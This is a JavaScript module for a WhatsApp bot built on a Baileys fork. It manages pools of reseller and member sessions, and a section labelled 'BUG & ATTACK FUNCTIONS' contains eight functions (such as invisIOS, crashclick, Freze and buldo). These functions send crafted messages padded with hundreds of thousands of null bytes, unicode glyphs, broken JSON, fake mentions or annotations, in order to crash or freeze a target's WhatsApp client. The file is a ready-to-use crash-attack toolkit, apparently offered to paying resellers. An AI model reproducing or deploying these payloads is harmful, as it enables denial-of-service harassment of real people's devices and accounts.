const fs = require('fs');
const path = require('path');
const { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    generateWAMessageFromContent, 
    prepareWAMessageMedia, 
    proto, 
    jidEncode, 
    jidDecode,
} = require("@bellachu/baileys");
const { encodeWAMessage, encodeSignedDeviceIdentity } = require('@bellachu/baileys/lib/Utils');
const pino = require('pino');
const { logger } = require('../utils/logger');
const crypto = require('crypto');

// Global State
const activeConnections = {};
const biz = {};
const mess = {};

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isVipOrOwner(user) {
  return user && ["reseller", "dev"].includes(user.role);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ==========================================
// SESSION MANAGEMENT: RESELLER
// ==========================================

function getVipSessionPath(sessionName) {
  return path.join('./reseller', sessionName);
}

function prepareVipSessionFolders() {
  const vipFolder = './reseller';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
      logger.info("Folder session RESELLER dibuat.");
    }

    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Error menyiapkan folder session RESELLER:", err.message);
    return [];
  }
}

async function connectVipSession(sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionPath = getVipSessionPath(sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          logger.info(`[RESELLER ${sessionName}] Terhubung`);

          const type = detectWATypeFromCreds(`${sessionPath}/creds.json`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.warn(`[RESELLER ${sessionName}] Koneksi ditutup. Status: ${statusCode}`);

          if (statusCode === 440) {
             logger.error(`[RESELLER ${sessionName}] Session Invalid/Overwrite.`);
             delete activeConnections[sessionName];
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectVipSession(sessionName, retries - 1));
          } else {
            logger.error(`[RESELLER ${sessionName}] Logout atau maksimal percobaan tercapai.`);
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[RESELLER ${sessionName}] Gagal memuat: ${err.message}`);
      resolve();
    }
  });
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  if (files.length === 0) return;

  logger.info(`[RESELLER] Memulai ${files.length} session RESELLER/Moderator...`);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectVipSession(baseName);
  }
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
}

function isVipSession(sessionName) {
  return fs.existsSync(getVipSessionPath(sessionName));
}

function getRandomVipConnection() {
  const vipConnections = getActiveVipConnections();
  const sessionNames = Object.keys(vipConnections);
  if (sessionNames.length === 0) return null;
  const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
  return vipConnections[randomSession];
}

// ==========================================
// SESSION MANAGEMENT: REGULAR (MEMBER)
// ==========================================

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logger.info("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error prepareAuthFolders: " + err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = path.join(folderPath, sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          logger.info(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();
        } else if (connection === "close") {
          logger.info(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(sessionsFold, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logger.info(`[${sessionName}] Logged out.`);
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[${sessionName}] Error: ${err.message}`);
      resolve();
    }
  });
}

function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) {
  if (isVipOrOwnerUser) {
    const vipConnections = getActiveVipConnections();
    const sessionNames = Object.keys(vipConnections);
    
    if (sessionNames.length > 0) {
      const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
      return vipConnections[randomSession];
    }
  }
  
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

async function startUserSessions() {
  try {
    await startVipSessions();

    if (!fs.existsSync('permenmd')) {
        fs.mkdirSync('permenmd');
    }

    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => fs.statSync(p).isDirectory());

    logger.info(`[DEBUG] Ditemukan ${subfolders.length} subfolder member di 'permenmd'`);

    for (const folder of subfolders) {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          continue;
        }

        connectSession(folder, sessionName).catch(err => {
             logger.error(`Gagal start session member ${sessionName}: ${err.message}`);
        });
      }
    }
  } catch (err) {
    logger.error("Fatal error in startUserSessions: " + err.message);
  }
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logger.info(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logger.error(`[${sessionName}] Gagal disconnect: ${e.message}`);
    }
    delete activeConnections[sessionName];
  }
  logger.info('Semua sesi dari activeConnections berhasil disconnect.');
}

// ==========================================
// BUG & ATTACK FUNCTIONS
// ==========================================


async function invisIOS(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      locationMessage: {
        name: "@raysofbeam" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
        address: "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
      }
    }, {});
    const msgs = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendedTextMessage: { 
            text: "CSMX!" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: "@raysofbeam",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "CSMX!" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
          }
        }
      }
    }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id, statusJidList: [target], additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }]
        }]
      }]
    });
    await sock.relayMessage("status@broadcast", msgs.message, {
      messageId: msgs.key.id, statusJidList: [target], additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }]
        }]
      }]
    });
  } catch (error) {
    console.log("error kontol: ", error);
  }
}


async function delay(sock, target) {
 const nanz = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "diem gw ew ntar",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(900000),
              version: 3
            }
          }
        }
      },
   };
      
 await sock.relayMessage(target, nanz, {
 messageId: null,
 participant: { jid: target },
 viewOnceMessage: {},
 })
}

async function crashclick(sock, target) {
 const lawliet = {
      viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "edgar is hare" },
                    footer: { text: "lawliet anti ampos" },
                    contextInfo: {},
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({
                                    booking_id: "apa nyak",
                                    status: "confirmed",
                                    business_name: "lawliet empire",
                                    service_name: "lawliet is here",
                                    appointment_time: "2026-04-28T10:00:00Z",
                                    customer: {
                                        name: "@lawlietlyora",
                                        phone: "6285148361751"
                                    }
                                })
                            }
                        ],
                        messageParamsJson: "{".repeat(9999)
                    }
                }
            }
        }
   };
      
 await sock.relayMessage(target, lawliet, {
 messageId: null,
 participant: { jid: target },
 viewOnceMessage: {},
 })
}


async function Freze(sock, target) {
    if (!target || !target.includes('@')) return
    
    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: " LAWLIET "
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 20 }, () => ({
                    name: "galaxy_message",
                    buttonParamsJson: "\u001A".repeat(5000)
                })),
                messageParamsJson: "\u001A".repeat(500000)
            }
        }
    }, { participant: { jid: target } })
}

async function blank(sock, target) {
const JMK = {
      interactiveMessage: {
       header: {
          title: "JMK? Fvck" },
            body: {
            text: "X:" },
            footer: { text: "JMK" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u300b",
                            id: "X"
                        })
                    },
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u600b",
                            url: "https://t.me/chicaatractiva",
                            merchant_url: "https://t.me/chicaatractiva"
                        })
                    },
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            display_text: "000000000000000",
                            id: "X"
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u0000".repeat(50000) + "\u0600".repeat(50000),
                            id: "\u200b".repeat(50000 ),
                            copy_code: "t.me/chicaatractiva"
                        })
                    }
                ]
            }
        }
    };
await sock.relayMessage(target, JMK,{});
console.log("sukses sending bvg");
}

async function spam(sock, target) {
  try {
    const five = {
      interactiveResponseMessage: {
        body: {
          text: "Lawliet nih bos",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: '{"values":{"in_pin_code":"999999","building_name":"","landmark_area":"18","address":"Amp4","tower_number":"","city":"","name":"Amp4","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X' + "\u0000".repeat(900000) + '"}}',
          version: 3
        }
      }
    };

    await sock.relayMessage(target, five, {
      participant: { jid: target }
    });
 
    console.log('Sukses Sent To: ' + target);
 
  } catch (err) {
    console.error('Error: ' + err.message);
  }
}

async function buldo(sock, target) {
    const message = {
      viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function jmk(sock, target) {
  for (var r = 0; r < 10; r++) {
    var jmk = {
      groupStatusMessageV2: {  
        message: {  
          videoMessage: {  
            url: "https://mmg.whatsapp.net/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0&mms3=true",  
            mimetype: "video/mp4",  
            fileSha256: "dy6rjLbf2Zdmt1V3y15X1WYHEsUXS1DUh4G6yV3fM2I=",  
            fileLength: "9",  
            seconds: 9,  
            mediaKey: "QOhY9TSI4bfSBp0Bzj80QyW5EYJ6OQL4Ak3pjb1vUMM=",  
            height: 9,  
            width: 9,  
            fileEncSha256: "g7ZxEPo0YUaHnEYkFfu8BvMh6g4Ib/Y7IzkJFEdZyW0=",  
            directPath: "/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0",  
            mediaKeyTimestamp: "0",  
            jpegThumbnail: null,
            contextInfo: {  
              pairedMediaType: 4,  
              statusSourceType: 0  
            },  
            annotations: Array.from({ length: 70000 }, () => ({  
              shouldSkipConfirmation: true,  
              embeddedContent: {  
                embeddedMusic: {  
                  author: "\r"  
                }  
              },  
              embeddedAction: true  
            }))
          }  
        }  
      }  
    };

    await sock.relayMessage(
      target,
      jmk,
      {}
    );
  }
}

// and
module.exports = {
  activeConnections,
  biz,
  mess,
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  sleep,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder,
  invisIOS,
  delay,
  crashclick,
  Freze,
  blank,
  spam,
  buldo,
  jmk
};